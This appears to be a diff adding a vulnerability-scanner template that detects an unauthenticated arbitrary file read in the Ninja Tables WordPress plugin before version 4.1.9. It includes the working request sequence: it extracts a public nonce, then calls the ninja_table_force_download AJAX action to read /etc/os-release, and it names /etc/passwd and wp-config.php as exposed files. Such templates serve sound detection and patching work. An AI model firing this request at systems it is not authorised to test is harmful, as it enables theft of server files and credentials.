@@ -1,0 +1,55 @@
+id: wp-ninja-tables-lfi
+
+info:
+  name: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
+  author: xbow,DhiyaneshDk
+  severity: high
+  description: |
+    The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable to an unauthenticated arbitrary file download vulnerability.The issue exists due to the improper validation of the 'url' parameter in the 'ninja_table_force_download' AJAX action, which allows an unauthenticated attacker to download sensitive files from the server, such as '/etc/passwd' or '/wp-config.php'.
+  remediation: Update the Ninja Tables plugin to version 4.1.9 or later.
+  reference:
+    - https://xbow.com/blog/xbow-ninja-tables/
+    - https://ninjatables.com/docs/change-log/#521-date-july-9-2025
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="/wp-content/plugins/ninja-tables/"
+  tags: ninja-tables,file-download,wordpress,unauth
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, "ninja_table")
+        internal: true
+
+    extractors:
+      - type: regex
+        name: public_nonce
+        part: body
+        group: 1
+        regex:
+          - '"ninja_table_public_nonce":"([a-z0-9]+)"'
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(content_type, "application/octet-stream")
+          - status_code == 200
+          - contains(body, "PRETTY_NAME=")
+        condition: and
